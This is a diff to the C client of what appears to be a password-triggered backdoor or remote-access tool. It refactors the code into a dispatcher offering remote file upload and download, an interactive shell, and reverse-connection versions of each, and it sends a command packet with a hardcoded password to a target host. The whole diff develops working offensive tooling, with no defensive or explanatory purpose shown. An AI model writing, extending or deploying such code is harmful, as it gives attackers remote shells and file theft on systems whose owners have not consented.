@@ -30,8 +30,39 @@ int usage(char *s) {
 	return -1;
 }
 
+void do_action(int action, int sock, char *file) {
+    switch(action) {
+        case UPLOAD:
+            printf("Uploading file\n");
+            client_upload(sock, file);
+            break;
+        case DOWNLOAD:
+            printf("Downloading file\n");
+            client_download(sock, file);
+            break;
+        case SHELL:
+            printf("Launching shell\n");
+            client_shell(sock);
+            break;
+        case RUPLOAD:
+            printf("Reverse uploading file\n");
+            client_upload(sock, file);
+            break;
+        case RDOWNLOAD:
+            printf("Reverse downloading file\n");
+            client_download(sock, file);
+            break;
+        case RSHELL:
+            printf("Launching reverse shell\n");
+            client_shell(sock);
+            break;
+        default:
+            printf("Invalid option: %d\n", action);
+    }
+}
+
 // Client actions
-int client_rshell(int sock) {
+int client_shell(int sock) {
     struct termios oldterm, newterm; 
     char buf[BUFSIZE];
 
@@ -73,7 +104,7 @@ int client_rshell(int sock) {
 	return 0;
 }
 
-int client_rupload(int sock, char *file) {
+int client_upload(int sock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     unsigned long size, transfered;
@@ -100,7 +131,7 @@ int client_rupload(int sock, char *file) {
     return 0;
 }
 
-int client_rdownload(int sock, char *file) {
+int client_download(int sock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     char *ptr = strrchr(file, '/');
@@ -122,23 +153,19 @@ int client_rdownload(int sock, char *file) {
     return 0;
 }
 
-int client_download() {
-	return 0;
+unsigned long resolve(const char *host) {
+    struct hostent *he;
+    struct sockaddr_in si;
+    
+    he = gethostbyname(host);
+    if (!he) {
+        return INADDR_NONE;
+    }
+    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
+    return si.sin_addr.s_addr;
 }
 
-int client_upload() {
-	return 0;
-}
-
-int client_check() {
-	return 0;
-}
-
-int client_listen() {
-	return 0;
-}
-
-unsigned long resolve(const char *host, char *ipname) {
+/*unsigned long resolve(const char *host, char *ipname) {
     struct  hostent *he;
     struct  sockaddr_in si;
     
@@ -149,7 +176,7 @@ unsigned long resolve(const char *host, char *ipname) {
     memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
     strcpy(ipname, inet_ntoa(si.sin_addr));
     return si.sin_addr.s_addr;
-}
+}*/
 
 void start_daemon(int action, int port, char *file) {
     int sock_listen, sock_con;
@@ -196,31 +223,8 @@ void start_daemon(int action, int port, char *file) {
 
     printf("Received connection!\n");
 
-    switch(action) {
-        case UPLOAD:
-            printf("Uploading file\n");
-            break;
-        case DOWNLOAD:
-            printf("Downloading file\n");
-            break;
-        case SHELL:
-            printf("Launching shell\n");
-            break;
-        case RUPLOAD:
-            printf("Reverse uploading file\n");
-            client_rupload(sock_con, file);
-            break;
-        case RDOWNLOAD:
-            printf("Reverse downloading file\n");
-            client_rdownload(sock_con, file);
-            break;
-        case RSHELL:
-            printf("Launching reverse shell\n");
-            client_rshell(sock_con);
-            break;
-        default:
-            printf("Invalid option: %d\n", action);
-    }
+    do_action(action, sock_con, file);
+
     exit(0);
 }
 
@@ -228,7 +232,7 @@ int main(int argc, char *argv[]) {
 	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0;
 	char *host = 0, *cmd, *file = 0;
     unsigned long ip;
-    char ipname[256];
+//    char ipname[256];
     struct data cmdpkt;
     struct sockaddr_in cli;
 
@@ -278,14 +282,15 @@ int main(int argc, char *argv[]) {
 	}
 
 	// Check hostname
-	ip = resolve(host, ipname);
+	ip = resolve(host);
+	//ip = resolve(host, ipname);
     if (ip == INADDR_NONE) {
         perror("host");
         return -1;
     }
 
 	// Launch daemon if is a reverse command
-	if ( reverse == 1) {
+	if (reverse || action == LISTEN) {
         switch (action) {
             case UPLOAD: action = RUPLOAD; break;
             case DOWNLOAD: action = RDOWNLOAD; break;
@@ -319,11 +324,16 @@ int main(int argc, char *argv[]) {
         memcpy(cmdpkt.pass, PASSWORD, strlen(PASSWORD));
         cmdpkt.port = local_port;
         cmdpkt.action = action;
-        memcpy(cmdpkt.file, file, strlen(file));
+        memcpy(cmdpkt.bytes, file, strlen(file));
 
         // Send packet
         write(sock, &cmdpkt, sizeof(cmdpkt));
-        close(sock);
+        if (reverse) {
+            close(sock);
+        } else {
+            do_action(action, sock, file);
+            close(sock);    
+        }
     }
 	return 0;
 }
